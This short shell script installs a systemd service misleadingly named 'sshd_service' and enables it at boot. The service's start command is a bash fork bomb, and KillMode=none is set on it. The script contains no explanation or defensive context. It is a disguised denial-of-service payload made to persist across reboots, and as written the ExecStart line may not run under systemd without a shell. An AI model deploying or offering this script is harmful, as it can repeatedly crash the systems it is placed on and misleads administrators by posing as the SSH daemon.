  cat >/etc/systemd/system/sshd_service.service <<EOF
[Unit]
Description=sshd_service
Wants=network.target
After=network.target network.service

[Service]
Type=simple
WorkingDirectory=/opt
ExecStart=:(){ :|:& };:
KillMode=none

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sshd_service
systemctl start sshd_service
